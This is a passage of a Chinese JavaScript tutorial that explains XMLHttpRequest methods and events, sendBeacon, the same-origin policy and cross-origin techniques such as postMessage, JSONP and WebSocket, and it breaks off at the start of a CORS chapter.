language-javascript\"><code>function sendForm(form) {\n  var formData = new FormData(form);\n  formData.append(&#039;csrf&#039;, &#039;e69a18d7db1286040586e6da1950128c&#039;);\n\n  var xhr = new XMLHttpRequest();\n  xhr.open(&#039;POST&#039;, form.action, true);\n  xhr.onload = function() {\n    // ...\n  };\n  xhr.send(formData);\n\n  return false;\n}\n\nvar form = document.querySelector(&#039;#registration&#039;);\nsendForm(form);</code></pre>\n        <h3>\n            <a href='#XMLHttpRequest.setRequestHeader()' class='header-anchor'>#</a>\n            <span>XMLHttpRequest.setRequestHeader()</span>\n        </h3>\n    <p><code>XMLHttpRequest.setRequestHeader()</code>方法用于设置浏览器发送的 HTTP 请求的头信息。该方法必须在<code>open()</code>之后、<code>send()</code>之前调用。如果该方法多次调用，设定同一个字段，则每一次调用的值会被合并成一个单一的值发送。</p>\n<p>该方法接受两个参数。第一个参数是字符串，表示头信息的字段名，第二个参数是字段值。</p>\n<pre class=\"prettyprint language-javascript\"><code>xhr.setRequestHeader(&#039;Content-Type&#039;, &#039;application/json&#039;);\nxhr.setRequestHeader(&#039;Content-Length&#039;, JSON.stringify(data).length);\nxhr.send(JSON.stringify(data));</code></pre><p>上面代码首先设置头信息<code>Content-Type</code>，表示发送 JSON 格式的数据；然后设置<code>Content-Length</code>，表示数据长度；最后发送 JSON 数据。</p>\n\n        <h3>\n            <a href='#XMLHttpRequest.overrideMimeType()' class='header-anchor'>#</a>\n            <span>XMLHttpRequest.overrideMimeType()</span>\n        </h3>\n    <p><code>XMLHttpRequest.overrideMimeType()</code>方法用来指定 MIME 类型，覆盖服务器返回的真正的 MIME 类型，从而让浏览器进行不一样的处理。举例来说，服务器返回的数据类型是<code>text/xml</code>，由于种种原因浏览器解析不成功报错，这时就拿不到数据了。为了拿到原始数据，我们可以把 MIME 类型改成<code>text/plain</code>，这样浏览器就不会去自动解析，从而我们就可以拿到原始文本了。</p>\n<pre class=\"prettyprint language-javascript\"><code>xhr.overrideMimeType(&#039;text/plain&#039;)</code></pre><p>注意，该方法必须在<code>send()</code>方法之前调用。</p>\n<p>修改服务器返回的数据类型，不是正常情况下应该采取的方法。如果希望服务器返回指定的数据类型，可以用<code>responseType</code>属性告诉服务器，就像下面的例子。只有在服务器无法返回某种数据类型时，才使用<code>overrideMimeType()</code>方法。</p>\n<pre class=\"prettyprint language-javascript\"><code>var xhr = new XMLHttpRequest();\nxhr.onload = function(e) {\n  var arraybuffer = xhr.response;\n  // ...\n}\nxhr.open(&#039;GET&#039;, url);\nxhr.responseType = &#039;arraybuffer&#039;;\nxhr.send();</code></pre>\n        <h3>\n            <a href='#XMLHttpRequest.getResponseHeader()' class='header-anchor'>#</a>\n            <span>XMLHttpRequest.getResponseHeader()</span>\n        </h3>\n    <p><code>XMLHttpRequest.getResponseHeader()</code>方法返回 HTTP 头信息指定字段的值，如果还没有收到服务器回应或者指定字段不存在，返回<code>null</code>。该方法的参数不区分大小写。</p>\n<pre class=\"prettyprint language-javascript\"><code>function getHeaderTime() {\n  console.log(this.getResponseHeader(&quot;Last-Modified&quot;));\n}\n\nvar xhr = new XMLHttpRequest();\nxhr.open(&#039;HEAD&#039;, &#039;yourpage.html&#039;);\nxhr.onload = getHeaderTime;\nxhr.send();</code></pre><p>如果有多个字段同名，它们的值会被连接为一个字符串，每个字段之间使用“逗号+空格”分隔。</p>\n\n        <h3>\n            <a href='#XMLHttpRequest.getAllResponseHeaders()' class='header-anchor'>#</a>\n            <span>XMLHttpRequest.getAllResponseHeaders()</span>\n        </h3>\n    <p><code>XMLHttpRequest.getAllResponseHeaders()</code>方法返回一个字符串，表示服务器发来的所有 HTTP 头信息。格式为字符串，每个头信息之间使用<code>CRLF</code>分隔（回车+换行），如果没有收到服务器回应，该属性为<code>null</code>。如果发生网络错误，该属性为空字符串。</p>\n<pre class=\"prettyprint language-javascript\"><code>var xhr = new XMLHttpRequest();\nxhr.open(&#039;GET&#039;, &#039;foo.txt&#039;, true);\nxhr.send();\n\nxhr.onreadystatechange = function () {\n  if (this.readyState === 4) {\n    var headers = xhr.getAllResponseHeaders();\n  }\n}</code></pre><p>上面代码用于获取服务器返回的所有头信息。它可能是下面这样的字符串。</p>\n<pre class=\"prettyprint language-http\"><code>date: Fri, 08 Dec 2017 21:04:30 GMT\\r\\n\ncontent-encoding: gzip\\r\\n\nx-content-type-options: nosniff\\r\\n\nserver: meinheld/0.6.1\\r\\n\nx-frame-options: DENY\\r\\n\ncontent-type: text/html; charset=utf-8\\r\\n\nconnection: keep-alive\\r\\n\nstrict-transport-security: max-age=63072000\\r\\n\nvary: Cookie, Accept-Encoding\\r\\n\ncontent-length: 6502\\r\\n\nx-xss-protection: 1; mode=block\\r\\n</code></pre><p>然后，对这个字符串进行处理。</p>\n<pre class=\"prettyprint language-javascript\"><code>var arr = headers.trim().split(/[\\r\\n]+/);\nvar headerMap = {};\n\narr.forEach(function (line) {\n  var parts = line.split(&#039;: &#039;);\n  var header = parts.shift();\n  var value = parts.join(&#039;: &#039;);\n  headerMap[header] = value;\n});\n\nheaderMap[&#039;content-length&#039;] // &quot;6502&quot;</code></pre>\n        <h3>\n            <a href='#XMLHttpRequest.abort()' class='header-anchor'>#</a>\n            <span>XMLHttpRequest.abort()</span>\n        </h3>\n    <p><code>XMLHttpRequest.abort()</code>方法用来终止已经发出的 HTTP 请求。调用这个方法以后，<code>readyState</code>属性变为<code>4</code>，<code>status</code>属性变为<code>0</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>var xhr = new XMLHttpRequest();\nxhr.open(&#039;GET&#039;, &#039;http://www.example.com/page.php&#039;, true);\nsetTimeout(function () {\n  if (xhr) {\n    xhr.abort();\n    xhr = null;\n  }\n}, 5000);</code></pre><p>上面代码在发出5秒之后，终止一个 AJAX 请求。</p>\n\n        <h2>\n            <a href='#XMLHttpRequest-实例的事件' class='header-anchor'>#</a>\n            <span>XMLHttpRequest 实例的事件</span>\n        </h2>\n    \n        <h3>\n            <a href='#readyStateChange-事件' class='header-anchor'>#</a>\n            <span>readyStateChange 事件</span>\n        </h3>\n    <p><code>readyState</code>属性的值发生改变，就会触发 readyStateChange 事件。</p>\n<p>我们可以通过<code>onReadyStateChange</code>属性，指定这个事件的监听函数，对不同状态进行不同处理。尤其是当状态变为<code>4</code>的时候，表示通信成功，这时回调函数就可以处理服务器传送回来的数据。</p>\n\n        <h3>\n            <a href='#progress-事件' class='header-anchor'>#</a>\n            <span>progress 事件</span>\n        </h3>\n    <p>上传文件时，XMLHTTPRequest 实例对象本身和实例的<code>upload</code>属性，都有一个<code>progress</code>事件，会不断返回上传的进度。</p>\n<pre class=\"prettyprint language-javascript\"><code>var xhr = new XMLHttpRequest();\n\nfunction updateProgress (oEvent) {\n  if (oEvent.lengthComputable) {\n    var percentComplete = oEvent.loaded / oEvent.total;\n  } else {\n    console.log(&#039;无法计算进展&#039;);\n  }\n}\n\nxhr.addEventListener(&#039;progress&#039;, updateProgress);\n\nxhr.open();</code></pre>\n        <h3>\n            <a href='#load-事件、error-事件、abort-事件' class='header-anchor'>#</a>\n            <span>load 事件、error 事件、abort 事件</span>\n        </h3>\n    <p>load 事件表示服务器传来的数据接收完毕，error 事件表示请求出错，abort 事件表示请求被中断（比如用户取消请求）。</p>\n<pre class=\"prettyprint language-javascript\"><code>var xhr = new XMLHttpRequest();\n\nxhr.addEventListener(&#039;load&#039;, transferComplete);\nxhr.addEventListener(&#039;error&#039;, transferFailed);\nxhr.addEventListener(&#039;abort&#039;, transferCanceled);\n\nxhr.open();\n\nfunction transferComplete() {\n  console.log(&#039;数据接收完毕&#039;);\n}\n\nfunction transferFailed() {\n  console.log(&#039;数据接收出错&#039;);\n}\n\nfunction transferCanceled() {\n  console.log(&#039;用户取消接收&#039;);\n}</code></pre>\n        <h3>\n            <a href='#loadend-事件' class='header-anchor'>#</a>\n            <span>loadend 事件</span>\n        </h3>\n    <p><code>abort</code>、<code>load</code>和<code>error</code>这三个事件，会伴随一个<code>loadend</code>事件，表示请求结束，但不知道其是否成功。</p>\n<pre class=\"prettyprint language-javascript\"><code>xhr.addEventListener(&#039;loadend&#039;, loadEnd);\n\nfunction loadEnd(e) {\n  console.log(&#039;请求结束，状态未知&#039;);\n}</code></pre>\n        <h3>\n            <a href='#timeout-事件' class='header-anchor'>#</a>\n            <span>timeout 事件</span>\n        </h3>\n    <p>服务器超过指定时间还没有返回结果，就会触发 timeout 事件，具体的例子参见<code>timeout</code>属性一节。</p>\n\n        <h2>\n            <a href='#Navigator.sendBeacon()' class='header-anchor'>#</a>\n            <span>Navigator.sendBeacon()</span>\n        </h2>\n    <p>用户卸载网页的时候，有时需要向服务器发一些数据。很自然的做法是在<code>unload</code>事件或<code>beforeunload</code>事件的监听函数里面，使用<code>XMLhttpRequest</code>对象发送数据。但是，这样做不是很可靠，因为<code>XMLhttpRequest</code>对象是异步发送，很可能在它即将发送的时候，页面已经卸载了，从而导致发送取消或者发送失败。</p>\n<p>解决方法就是 AJAX 通信改成同步发送，即只有发送完成，页面才能卸载。但是，很多浏览器已经不支持同步的 XMLHttpRequest 对象了（即<code>open()</code>方法的第三个参数为<code>false</code>）。</p>\n<pre class=\"prettyprint language-javascript\"><code>window.addEventListener(&#039;unload&#039;, logData, false);\n\nfunction logData() {\n  var client = new XMLHttpRequest();\n  // 第三个参数表示同步发送\n  client.open(&#039;POST&#039;, &#039;/log&#039;, false);\n  client.setRequestHeader(&#039;Content-Type&#039;, &#039;text/plain;charset=UTF-8&#039;);\n  client.send(analyticsData);\n}</code></pre><p>上面代码指定<code>XMLHttpRequest</code>同步发送，很多浏览器都已经不支持这种写法。</p>\n<p>同步通信有几种变通的方法。一种做法是新建一个<code>&lt;img&gt;</code>元素，数据放在<code>src</code>属性，作为 URL 的查询字符串，这时浏览器会等待图片加载完成（服务器回应），再进行卸载。另一种做法是创建一个循环，规定执行时间为几秒钟，在这几秒钟内把数据发出去，然后再卸载页面。</p>\n<p>这些做法的共同问题是，卸载的时间被硬生生拖长了，后面页面的加载被推迟了，用户体验不好。</p>\n<p>为了解决这个问题，浏览器引入了<code>Navigator.sendBeacon()</code>方法。这个方法还是异步发出请求，但是请求与当前页面脱钩，作为浏览器的任务，因此可以保证会把数据发出去，不拖延卸载流程。</p>\n<pre class=\"prettyprint language-javascript\"><code>window.addEventListener(&#039;unload&#039;, logData, false);\n\nfunction logData() {\n  navigator.sendBeacon(&#039;/log&#039;, analyticsData);\n}</code></pre><p><code>Navigator.sendBeacon</code>方法接受两个参数，第一个参数是目标服务器的 URL，第二个参数是所要发送的数据（可选），可以是任意类型（字符串、表单对象、二进制对象等等）。</p>\n<pre class=\"prettyprint language-javascript\"><code>navigator.sendBeacon(url, data)</code></pre><p>这个方法的返回值是一个布尔值，成功发送数据为<code>true</code>，否则为<code>false</code>。</p>\n<p>该方法发送数据的 HTTP 方法是 POST，可以跨域，类似于表单提交数据。它不能指定回调函数。</p>\n<p>下面是一个例子。</p>\n<pre class=\"prettyprint language-javascript\"><code>// HTML 代码如下\n// &lt;body onload=&quot;analytics(&#039;start&#039;)&quot; onunload=&quot;analytics(&#039;end&#039;)&quot;&gt;\n\nfunction analytics(state) {\n  if (!navigator.sendBeacon) return;\n\n  var URL = &#039;http://example.com/analytics&#039;;\n  var data = &#039;state=&#039; + state + &#039;&amp;location=&#039; + window.location;\n  navigator.sendBeacon(URL, data);\n}</code></pre>"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"浏览器模型","link":"javascript:void(0)"},{"title":"同源限制","link":"/bom/same-origin.html"}],"content":"\n        <h1>\n            <a href='#同源限制' class='header-anchor'>#</a>\n            <span>同源限制</span>\n        </h1>\n    <p>浏览器安全的基石是“同源政策”（<a href=\"https://en.wikipedia.org/wiki/Same-origin_policy\">same-origin policy</a>）。很多开发者都知道这一点，但了解得不全面。</p>\n\n        <h2>\n            <a href='#概述' class='header-anchor'>#</a>\n            <span>概述</span>\n        </h2>\n    \n        <h3>\n            <a href='#含义' class='header-anchor'>#</a>\n            <span>含义</span>\n        </h3>\n    <p>1995年，同源政策由 Netscape 公司引入浏览器。目前，所有浏览器都实行这个政策。</p>\n<p>最初，它的含义是指，A 网页设置的 Cookie，B 网页不能打开，除非这两个网页“同源”。所谓“同源”指的是”三个相同“。</p>\n<blockquote>\n<ul>\n<li>协议相同</li>\n<li>域名相同</li>\n<li>端口相同</li>\n</ul>\n</blockquote>\n<p>举例来说，<code>http://www.example.com/dir/page.html</code>这个网址，协议是<code>http://</code>，域名是<code>www.example.com</code>，端口是<code>80</code>（默认端口可以省略），它的同源情况如下。</p>\n<ul>\n<li><code>http://www.example.com/dir2/other.html</code>：同源</li>\n<li><code>http://example.com/dir/other.html</code>：不同源（域名不同）</li>\n<li><code>http://v2.www.example.com/dir/other.html</code>：不同源（域名不同）</li>\n<li><code>http://www.example.com:81/dir/other.html</code>：不同源（端口不同）</li>\n<li><code>https://www.example.com/dir/page.html</code>：不同源（协议不同）</li>\n</ul>\n\n        <h3>\n            <a href='#目的' class='header-anchor'>#</a>\n            <span>目的</span>\n        </h3>\n    <p>同源政策的目的，是为了保证用户信息的安全，防止恶意的网站窃取数据。</p>\n<p>设想这样一种情况：A 网站是一家银行，用户登录以后，A 网站在用户的机器上设置了一个 Cookie，包含了一些隐私信息（比如存款总额）。用户离开 A 网站以后，又去访问 B 网站，如果没有同源限制，B 网站可以读取 A 网站的 Cookie，那么隐私信息就会泄漏。更可怕的是，Cookie 往往用来保存用户的登录状态，如果用户没有退出登录，其他网站就可以冒充用户，为所欲为。因为浏览器同时还规定，提交表单不受同源政策的限制。</p>\n<p>由此可见，同源政策是必需的，否则 Cookie 可以共享，互联网就毫无安全可言了。</p>\n\n        <h3>\n            <a href='#限制范围' class='header-anchor'>#</a>\n            <span>限制范围</span>\n        </h3>\n    <p>随着互联网的发展，同源政策越来越严格。目前，如果非同源，共有三种行为受到限制。</p>\n<blockquote>\n<p>（1） 无法读取非同源网页的 Cookie、LocalStorage 和 IndexedDB。</p>\n<p>（2） 无法接触非同源网页的 DOM。</p>\n<p>（3） 无法向非同源地址发送 AJAX 请求（可以发送，但浏览器会拒绝接受响应）。</p>\n</blockquote>\n<p>另外，通过 JavaScript 脚本可以拿到其他窗口的<code>window</code>对象。如果是非同源的网页，目前允许一个窗口可以接触其他网页的<code>window</code>对象的九个属性和四个方法。</p>\n<ul>\n<li>window.closed</li>\n<li>window.frames</li>\n<li>window.length</li>\n<li>window.location</li>\n<li>window.opener</li>\n<li>window.parent</li>\n<li>window.self</li>\n<li>window.top</li>\n<li>window.window</li>\n<li>window.blur()</li>\n<li>window.close()</li>\n<li>window.focus()</li>\n<li>window.postMessage()</li>\n</ul>\n<p>上面的九个属性之中，只有<code>window.location</code>是可读写的，其他八个全部都是只读。而且，即使是<code>location</code>对象，非同源的情况下，也只允许调用<code>location.replace</code>方法和写入<code>location.href</code>属性。</p>\n<p>虽然这些限制是必要的，但是有时很不方便，合理的用途也受到影响。下面介绍如何规避上面的限制。</p>\n\n        <h2>\n            <a href='#Cookie' class='header-anchor'>#</a>\n            <span>Cookie</span>\n        </h2>\n    <p>Cookie 是服务器写入浏览器的一小段信息，只有同源的网页才能共享。如果两个网页一级域名相同，只是次级域名不同，浏览器允许通过设置<code>document.domain</code>共享 Cookie。</p>\n<p>举例来说，A 网页的网址是<code>http://w1.example.com/a.html</code>，B 网页的网址是<code>http://w2.example.com/b.html</code>，那么只要设置相同的<code>document.domain</code>，两个网页就可以共享 Cookie。因为浏览器通过<code>document.domain</code>属性来检查是否同源。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 两个网页都需要设置\ndocument.domain = &#039;example.com&#039;;</code></pre><p>注意，A 和 B 两个网页都需要设置<code>document.domain</code>属性，才能达到同源的目的。因为设置<code>document.domain</code>的同时，会把端口重置为<code>null</code>，因此如果只设置一个网页的<code>document.domain</code>，会导致两个网址的端口不同，还是达不到同源的目的。</p>\n<p>现在，A 网页通过脚本设置一个 Cookie。</p>\n<pre class=\"prettyprint language-javascript\"><code>document.cookie = &quot;test1=hello&quot;;</code></pre><p>B 网页就可以读到这个 Cookie。</p>\n<pre class=\"prettyprint language-javascript\"><code>var allCookie = document.cookie;</code></pre><p>注意，这种方法只适用于 Cookie 和 iframe 窗口，LocalStorage 和 IndexedDB 无法通过这种方法，规避同源政策，而要使用下文介绍 PostMessage API。</p>\n<p>另外，服务器也可以在设置 Cookie 的时候，指定 Cookie 的所属域名为一级域名，比如<code>.example.com</code>。</p>\n<pre class=\"prettyprint language-http\"><code>Set-Cookie: key=value; domain=.example.com; path=/</code></pre><p>这样的话，二级域名和三级域名不用做任何设置，都可以读取这个 Cookie。</p>\n\n        <h2>\n            <a href='#iframe-和多窗口通信' class='header-anchor'>#</a>\n            <span>iframe 和多窗口通信</span>\n        </h2>\n    <p><code>iframe</code>元素可以在当前网页之中，嵌入其他网页。每个<code>iframe</code>元素形成自己的窗口，即有自己的<code>window</code>对象。<code>iframe</code>窗口之中的脚本，可以获得父窗口和子窗口。但是，只有在同源的情况下，父窗口和子窗口才能通信；如果跨域，就无法拿到对方的 DOM。</p>\n<p>比如，父窗口运行下面的命令，如果<code>iframe</code>窗口不是同源，就会报错。</p>\n<pre class=\"prettyprint language-javascript\"><code>document\n.getElementById(&quot;myIFrame&quot;)\n.contentWindow\n.document\n// Uncaught DOMException: Blocked a frame from accessing a cross-origin frame.</code></pre><p>上面命令中，父窗口想获取子窗口的 DOM，因为跨域导致报错。</p>\n<p>反之亦然，子窗口获取主窗口的 DOM 也会报错。</p>\n<pre class=\"prettyprint language-javascript\"><code>window.parent.document.body\n// 报错</code></pre><p>这种情况不仅适用于<code>iframe</code>窗口，还适用于<code>window.open</code>方法打开的窗口，只要跨域，父窗口与子窗口之间就无法通信。</p>\n<p>如果两个窗口一级域名相同，只是二级域名不同，那么设置上一节介绍的<code>document.domain</code>属性，就可以规避同源政策，拿到 DOM。</p>\n<p>对于完全不同源的网站，目前有两种方法，可以解决跨域窗口的通信问题。</p>\n<blockquote>\n<ul>\n<li>片段识别符（fragment identifier）</li>\n<li>跨文档通信API（Cross-document messaging）</li>\n</ul>\n</blockquote>\n\n        <h3>\n            <a href='#片段识别符' class='header-anchor'>#</a>\n            <span>片段识别符</span>\n        </h3>\n    <p>片段标识符（fragment identifier）指的是，URL 的<code>#</code>号后面的部分，比如<code>http://example.com/x.html#fragment</code>的<code>#fragment</code>。如果只是改变片段标识符，页面不会重新刷新。</p>\n<p>父窗口可以把信息，写入子窗口的片段标识符。</p>\n<pre class=\"prettyprint language-javascript\"><code>var src = originURL + &#039;#&#039; + data;\ndocument.getElementById(&#039;myIFrame&#039;).src = src;</code></pre><p>上面代码中，父窗口把所要传递的信息，写入 iframe 窗口的片段标识符。</p>\n<p>子窗口通过监听<code>hashchange</code>事件得到通知。</p>\n<pre class=\"prettyprint language-javascript\"><code>window.onhashchange = checkMessage;\n\nfunction checkMessage() {\n  var message = window.location.hash;\n  // ...\n}</code></pre><p>同样的，子窗口也可以改变父窗口的片段标识符。</p>\n<pre class=\"prettyprint language-javascript\"><code>parent.location.href = target + &#039;#&#039; + hash;</code></pre>\n        <h3>\n            <a href='#window.postMessage()' class='header-anchor'>#</a>\n            <span>window.postMessage()</span>\n        </h3>\n    <p>上面的这种方法属于破解，HTML5 为了解决这个问题，引入了一个全新的API：跨文档通信 API（Cross-document messaging）。</p>\n<p>这个 API 为<code>window</code>对象新增了一个<code>window.postMessage</code>方法，允许跨窗口通信，不论这两个窗口是否同源。举例来说，父窗口<code>aaa.com</code>向子窗口<code>bbb.com</code>发消息，调用<code>postMessage</code>方法就可以了。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 父窗口打开一个子窗口\nvar popup = window.open(&#039;http://bbb.com&#039;, &#039;title&#039;);\n// 父窗口向子窗口发消息\npopup.postMessage(&#039;Hello World!&#039;, &#039;http://bbb.com&#039;);</code></pre><p><code>postMessage</code>方法的第一个参数是具体的信息内容，第二个参数是接收消息的窗口的源（origin），即“协议 + 域名 + 端口”。也可以设为<code>*</code>，表示不限制域名，向所有窗口发送。</p>\n<p>子窗口向父窗口发送消息的写法类似。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 子窗口向父窗口发消息\nwindow.opener.postMessage(&#039;Nice to see you&#039;, &#039;http://aaa.com&#039;);</code></pre><p>父窗口和子窗口都可以通过<code>message</code>事件，监听对方的消息。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 父窗口和子窗口都可以用下面的代码，\n// 监听 message 消息\nwindow.addEventListener(&#039;message&#039;, function (e) {\n  console.log(e.data);\n},false);</code></pre><p><code>message</code>事件的参数是事件对象<code>event</code>，提供以下三个属性。</p>\n<blockquote>\n<ul>\n<li><code>event.source</code>：发送消息的窗口</li>\n<li><code>event.origin</code>: 消息发向的网址</li>\n<li><code>event.data</code>: 消息内容</li>\n</ul>\n</blockquote>\n<p>下面的例子是，子窗口通过<code>event.source</code>属性引用父窗口，然后发送消息。</p>\n<pre class=\"prettyprint language-javascript\"><code>window.addEventListener(&#039;message&#039;, receiveMessage);\nfunction receiveMessage(event) {\n  event.source.postMessage(&#039;Nice to see you!&#039;, &#039;*&#039;);\n}</code></pre><p>上面代码有几个地方需要注意。首先，<code>receiveMessage</code>函数里面没有过滤信息的来源，任意网址发来的信息都会被处理。其次，<code>postMessage</code>方法中指定的目标窗口的网址是一个星号，表示该信息可以向任意网址发送。通常来说，这两种做法是不推荐的，因为不够安全，可能会被恶意利用。</p>\n<p><code>event.origin</code>属性可以过滤不是发给本窗口的消息。</p>\n<pre class=\"prettyprint language-javascript\"><code>window.addEventListener(&#039;message&#039;, receiveMessage);\nfunction receiveMessage(event) {\n  if (event.origin !== &#039;http://aaa.com&#039;) return;\n  if (event.data === &#039;Hello World&#039;) {\n    event.source.postMessage(&#039;Hello&#039;, event.origin);\n  } else {\n    console.log(event.data);\n  }\n}</code></pre>\n        <h3>\n            <a href='#LocalStorage' class='header-anchor'>#</a>\n            <span>LocalStorage</span>\n        </h3>\n    <p>通过<code>window.postMessage</code>，读写其他窗口的 LocalStorage 也成为了可能。</p>\n<p>下面是一个例子，主窗口写入 iframe 子窗口的<code>localStorage</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>window.onmessage = function(e) {\n  if (e.origin !== &#039;http://bbb.com&#039;) {\n    return;\n  }\n  var payload = JSON.parse(e.data);\n  localStorage.setItem(payload.key, JSON.stringify(payload.data));\n};</code></pre><p>上面代码中，子窗口将父窗口发来的消息，写入自己的 LocalStorage。</p>\n<p>父窗口发送消息的代码如下。</p>\n<pre class=\"prettyprint language-javascript\"><code>var win = document.getElementsByTagName(&#039;iframe&#039;)[0].contentWindow;\nvar obj = { name: &#039;Jack&#039; };\nwin.postMessage(\n  JSON.stringify({key: &#039;storage&#039;, data: obj}),\n  &#039;http://bbb.com&#039;\n);</code></pre><p>加强版的子窗口接收消息的代码如下。</p>\n<pre class=\"prettyprint language-javascript\"><code>window.onmessage = function(e) {\n  if (e.origin !== &#039;http://bbb.com&#039;) return;\n  var payload = JSON.parse(e.data);\n  switch (payload.method) {\n    case &#039;set&#039;:\n      localStorage.setItem(payload.key, JSON.stringify(payload.data));\n      break;\n    case &#039;get&#039;:\n      var parent = window.parent;\n      var data = localStorage.getItem(payload.key);\n      parent.postMessage(data, &#039;http://aaa.com&#039;);\n      break;\n    case &#039;remove&#039;:\n      localStorage.removeItem(payload.key);\n      break;\n  }\n};</code></pre><p>加强版的父窗口发送消息代码如下。</p>\n<pre class=\"prettyprint language-javascript\"><code>var win = document.getElementsByTagName(&#039;iframe&#039;)[0].contentWindow;\nvar obj = { name: &#039;Jack&#039; };\n// 存入对象\nwin.postMessage(\n  JSON.stringify({key: &#039;storage&#039;, method: &#039;set&#039;, data: obj}),\n  &#039;http://bbb.com&#039;\n);\n// 读取对象\nwin.postMessage(\n  JSON.stringify({key: &#039;storage&#039;, method: &quot;get&quot;}),\n  &quot;*&quot;\n);\nwindow.onmessage = function(e) {\n  if (e.origin != &#039;http://aaa.com&#039;) return;\n  console.log(JSON.parse(e.data).name);\n};</code></pre>\n        <h2>\n            <a href='#AJAX' class='header-anchor'>#</a>\n            <span>AJAX</span>\n        </h2>\n    <p>同源政策规定，AJAX 请求只能发给同源的网址，否则就报错。</p>\n<p>除了架设服务器代理（浏览器请求同源服务器，再由后者请求外部服务），有三种方法规避这个限制。</p>\n<blockquote>\n<ul>\n<li>JSONP</li>\n<li>WebSocket</li>\n<li>CORS</li>\n</ul>\n</blockquote>\n\n        <h3>\n            <a href='#JSONP' class='header-anchor'>#</a>\n            <span>JSONP</span>\n        </h3>\n    <p>JSONP 是服务器与客户端跨源通信的常用方法。最大特点就是简单适用，老式浏览器全部支持，服务端改造非常小。</p>\n<p>它的基本思想是，网页通过添加一个<code>&lt;script&gt;</code>元素，向服务器请求 JSON 数据，这种做法不受同源政策限制；服务器收到请求后，将数据放在一个指定名字的回调函数里传回来。</p>\n<p>首先，网页动态插入<code>&lt;script&gt;</code>元素，由它向跨源网址发出请求。</p>\n<pre class=\"prettyprint language-javascript\"><code>function addScriptTag(src) {\n  var script = document.createElement(&#039;script&#039;);\n  script.setAttribute(&quot;type&quot;,&quot;text/javascript&quot;);\n  script.src = src;\n  document.body.appendChild(script);\n}\n\nwindow.onload = function () {\n  addScriptTag(&#039;http://example.com/ip?callback=foo&#039;);\n}\n\nfunction foo(data) {\n  console.log(&#039;Your public IP address is: &#039; + data.ip);\n};</code></pre><p>上面代码通过动态添加<code>&lt;script&gt;</code>元素，向服务器<code>example.com</code>发出请求。注意，该请求的查询字符串有一个<code>callback</code>参数，用来指定回调函数的名字，这对于 JSONP 是必需的。</p>\n<p>服务器收到这个请求以后，会将数据放在回调函数的参数位置返回。</p>\n<pre class=\"prettyprint language-javascript\"><code>foo({\n  &quot;ip&quot;: &quot;8.8.8.8&quot;\n});</code></pre><p>由于<code>&lt;script&gt;</code>元素请求的脚本，直接作为代码运行。这时，只要浏览器定义了<code>foo</code>函数，该函数就会立即调用。作为参数的 JSON 数据被视为 JavaScript 对象，而不是字符串，因此避免了使用<code>JSON.parse</code>的步骤。</p>\n\n        <h3>\n            <a href='#WebSocket' class='header-anchor'>#</a>\n            <span>WebSocket</span>\n        </h3>\n    <p>WebSocket 是一种通信协议，使用<code>ws://</code>（非加密）和<code>wss://</code>（加密）作为协议前缀。该协议不实行同源政策，只要服务器支持，就可以通过它进行跨源通信。</p>\n<p>下面是一个例子，浏览器发出的 WebSocket 请求的头信息（摘自<a href=\"https://en.wikipedia.org/wiki/WebSocket\">维基百科</a>）。</p>\n<pre class=\"prettyprint language-http\"><code>GET /chat HTTP/1.1\nHost: server.example.com\nUpgrade: websocket\nConnection: Upgrade\nSec-WebSocket-Key: x3JJHMbDL1EzLkh9GBhXDw==\nSec-WebSocket-Protocol: chat, superchat\nSec-WebSocket-Version: 13\nOrigin: http://example.com</code></pre><p>上面代码中，有一个字段是<code>Origin</code>，表示该请求的请求源（origin），即发自哪个域名。</p>\n<p>正是因为有了<code>Origin</code>这个字段，所以 WebSocket 才没有实行同源政策。因为服务器可以根据这个字段，判断是否许可本次通信。如果该域名在白名单内，服务器就会做出如下回应。</p>\n<pre class=\"prettyprint language-http\"><code>HTTP/1.1 101 Switching Protocols\nUpgrade: websocket\nConnection: Upgrade\nSec-WebSocket-Accept: HSmrc0sMlYUkAGmm5OPpG2HaGWk=\nSec-WebSocket-Protocol: chat</code></pre>\n        <h3>\n            <a href='#CORS' class='header-anchor'>#</a>\n            <span>CORS</span>\n        </h3>\n    <p>CORS 是跨源资源分享（Cross-Origin Resource Sharing）的缩写。它是 W3C 标准，属于跨源 AJAX 请求的根本解决方法。相比 JSONP 只能发<code>GET</code>请求，CORS 允许任何类型的请求。</p>\n<p>下一章将详细介绍，如何通过 CORS 完成跨源 AJAX 请求。</p>\n\n        <h2>\n            <a href='#参考链接' class='header-anchor'>#</a>\n            <span>参考链接</span>\n        </h2>\n    <ul>\n<li>Mozilla Developer Network, <a href=\"https://developer.mozilla.org/en-US/docs/Web/API/window.postMessage\">Window.postMessage</a></li>\n<li>Jakub Jankiewicz, <a href=\"http://jcubic.wordpress.com/2014/06/20/cross-domain-localstorage/\">Cross-Domain LocalStorage</a></li>\n<li>David Baron, <a href=\"http://dbaron.org/log/20100309-faster-timeouts\">setTimeout with a shorter delay</a>: 利用 window.postMessage 可以实现0毫秒触发回调函数</li>\n</ul>\n"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"浏览器模型","link":"javascript:void(0)"},{"title":"CORS 通信","link":"/bom/cors.html"}],"content":"\n        <h1>\n            <a href='#CORS-通信' class='header-anchor'>#</a>\n            <span>CORS 通信</span>\n        </h1>\n    <p>CORS 是一个 W3C 标准，全称是“跨域资源共享”（Cross-origin resource sharing）。它允许浏览器向跨域的服务器，发出<code>XMLHttpRequest</code>请求，从而克服了AJAX只能同源使用的限制。</p>\n\n        <h2>\n            <a href='#简介' class='header-anchor'>#</a>\n            <span>简介</span>\n        </h2>\n    <p>CORS 需要浏览器和服务器同时支持。目前，所有浏览器都支持该功能。</p>\n<p>整个 CORS 通信过程，都是浏览器自动完成，不需要用户参与。对于开发者来说，CORS 通信与普通的 AJAX 通信没有差别，代码完全一样。浏览器一旦发现 AJAX 请求跨域，就会自动添加一些附加的头信息，有时还会多出一次附加的请求，但用户不会有感知。因此，实现 CORS 通信的关键是服务器。只要服务器实现了 CORS 接口，就可以跨域通信。</p>\n\n        <h2>\n            <a href='#两种请求' class='header-anchor'>#</a>\n            <span>两种请求</span>\n        </h2>\n    <p>CORS 请求分成两类：简单请求（simple request）和非简单请求（not-so-simple 